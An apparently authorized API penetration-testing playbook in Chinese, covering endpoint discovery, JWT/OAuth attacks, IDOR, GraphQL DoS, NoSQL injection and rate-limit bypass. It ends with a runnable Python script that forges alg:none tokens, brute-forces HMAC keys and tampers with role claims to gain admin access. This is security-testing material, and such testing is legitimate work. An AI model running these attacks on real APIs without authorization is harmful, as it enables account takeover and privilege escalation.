# API 安全测试（api-security）

目标：覆盖 REST / GraphQL / WebSocket / SOAP 全协议，从发现到利用。**先发现端点，再测认证授权，最后测业务逻辑。**

## 一、10 阶段测试流程

### Phase 1: API 发现与侦察
```bash
# 主动发现
# Vespasian：无头浏览器爬取 → OpenAPI/GraphQL SDL
# Kiterunner / ffuf：爆破未文档化端点
# 检查常见路径：/swagger.json /openapi.json /graphql /api-docs
```

GraphQL 内省三级尝试：标准内省查询 → 精简查询（绕 WAF）→ 仅查 `__schema { types { name } }`。

### Phase 2: 认证测试
**JWT**（jwt_tool / Burp）：
- `alg:none` 攻击：头部改 `"alg":"none"`，清空签名
- 密钥混淆：RS256 公钥 → HS256 对称密钥
- 弱 HMAC 爆破：`jwt_tool -C -d wordlist.txt`
- 声明篡改：改 `exp`/`iat`/`sub`/`role`
- `kid` 注入：`../../etc/passwd` → HMAC 签名绕过

**OAuth 2.0**：redirect_uri 操控、state 缺失 CSRF、Token 在 Referer 泄漏、PKCE 缺失。

### Phase 3: 授权测试（BOLA/IDOR/BFLA）
- **BOLA**：遍历数字 ID `/user/1→/user/2`、UUID、用户名/邮箱；Burp Autorize 双会话对比
- **BFLA**：普通用户执行管理员 API、HTTP 方法切换、API 版本降级、批量操作注入

### Phase 4: GraphQL 专项
内省泄漏、别名过载 DoS、批查询 DoS、字段重复、指令过载、循环查询、字段建议信息泄漏、GraphiQL 暴露、GET 突变 CSRF、追踪模式元数据泄漏。

### Phase 5: REST 输入验证
- HTTP 方法切换、Content-Type 篡改、NoSQL 注入 `{"$gt":""}`、SSRF via URL、XXE、参数污染、批量赋值

### Phase 6: 业务逻辑与差分测试
多角色权限矩阵、优惠券/积分/价格操控、竞态条件 TOCTOU。

### Phase 7: WebSocket 测试
端点发现、消息注入、超大消息、类型混淆、跨站点 WebSocket 劫持（CSWH）。

### Phase 8: 限速与 DoS
限速绕过（X-Forwarded-For）、路径变体、Slowloris、GraphQL 批查询 DoS、IP 轮换。

### Phase 9: 数据暴露
响应过度暴露、分页枚举、错误消息泄漏、GraphQL 嵌套越权、OpenAPI 暴露敏感端点。

### Phase 10: CI/CD 集成
spec 变更自动重跑、按严重度阈值阻断构建、发现持久化为回归测试。

## 二、工具链

| 工具 | 用途 |
|---|---|
| Vespasian | 流量→OpenAPI/GraphQL 规范 |
| Entropy | LLM 生成攻击场景 |
| jwt_tool | JWT 全面测试 |
| Burp Autorize | 双会话授权对比 |
| FireTail | GraphQL 专项测试 |
| ffuf / Kiterunner | 端点爆破 |

## 三、验证

- [ ] 每个漏洞给出可复现 PoC（请求/响应完整，他人可照此复现）
- [ ] 授权漏洞用双会话对比确认（低权限会话与高权限会话对同一资源访问，响应差异明确）
- [ ] JWT 攻击每个变体有测试记录（alg:none/密钥混淆/弱 HMAC/声明篡改/kid 注入，每项有结果）
- [ ] GraphQL 内省/DoS 有测试证据（内省查询、别名过载、批查询，每项有响应记录）
- [ ] 限速绕过用多 IP 验证（不同 IP 轮换后限速未生效，有请求日志佐证）
- [ ] 漏洞影响面说明完整（每个漏洞标注影响范围、严重度、修复建议）

## 三·五、代码骨架：JWT 攻击测试脚本

> 可运行的 Python 骨架，对目标 API 执行 JWT 攻击变体测试。关键端点/密钥按样本替换。

```python
# jwt_attack_test.py — JWT 攻击测试骨架（Python）
# 对目标 API 执行 JWT 攻击变体，记录每项结果

import requests
import json
import base64
import hashlib
import hmac

TARGET_URL = "[API_URL]"
# 占位：从样本获取的合法 JWT
LEGIT_JWT = "[LEGIT_JWT]"

def b64url_decode(s):
    """Base64URL 解码"""
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * (-len(s) % 4))

def b64url_encode(data):
    """Base64URL 编码"""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def test_alg_none(jwt):
    """alg:none 攻击：头部改 none，清空签名"""
    parts = jwt.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = b64url_decode(parts[1])
    header["alg"] = "none"
    new_header = b64url_encode(json.dumps(header).encode())
    new_jwt = f"{new_header}.{parts[1]}."
    resp = requests.get(TARGET_URL, headers={"Authorization": f"Bearer {new_jwt}"})
    return resp.status_code == 200, new_jwt, resp.status_code

def test_weak_hmac(jwt, wordlist):
    """弱 HMAC 爆破：用字典爆破签名密钥"""
    parts = jwt.split(".")
    header = b64url_decode(parts[0])
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    signature = b64url_decode(parts[2])

    for word in wordlist:
        key = word.encode()
        calc = hmac.new(key, signing_input, hashlib.sha256).digest()
        if calc == signature:
            return True, word, "HMAC key found"
    return False, None, "no key in wordlist"

def test_claim_tampering(jwt):
    """声明篡改：修改 exp/role 等声明"""
    parts = jwt.split(".")
    payload = json.loads(b64url_decode(parts[1]))
    payload["role"] = "admin"
    payload["exp"] = 9999999999
    new_payload = b64url_encode(json.dumps(payload).encode())
    # 签名不变（若服务端未校验签名则可能通过）
    new_jwt = f"{parts[0]}.{new_payload}.{parts[2]}"
    resp = requests.get(TARGET_URL, headers={"Authorization": f"Bearer {new_jwt}"})
    return resp.status_code == 200, new_jwt, resp.status_code

def main():
    print("=== JWT 攻击测试 ===")
    results = []

    # 1. alg:none
    ok, jwt, code = test_alg_none(LEGIT_JWT)
    print(f"[1] alg:none: {'VULNERABLE' if ok else 'SAFE'} (status={code})")
    results.append(("alg:none", ok))

    # 2. 弱 HMAC（需字典）
    wordlist_path = "[WORDLIST_PATH]"
    with open(wordlist_path) as f:
        wordlist = f.read().splitlines()
    ok, key, msg = test_weak_hmac(LEGIT_JWT, wordlist)
    print(f"[2] weak_hmac: {'VULNERABLE' if ok else 'SAFE'} ({msg})")
    results.append(("weak_hmac", ok))

    # 3. 声明篡改
    ok, jwt, code = test_claim_tampering(LEGIT_JWT)
    print(f"[3] claim_tampering: {'VULNERABLE' if ok else 'SAFE'} (status={code})")
    results.append(("claim_tampering", ok))

    vuln = sum(1 for _, ok in results if ok)
    print(f"\n=== 汇总 ===")
    print(f"可利用变体: {vuln}/{len(results)}")

if __name__ == "__main__":
    main()
```

运行：`pip install requests && python3 jwt_attack_test.py`。验证：每项攻击测试结果明确，可利用变体数量汇总，PoC 可复现。

> 更新：2026-11-17 · 来源：骨架为通用模板，配合 §二 认证测试使用
- 限速绕过用多 IP 验证
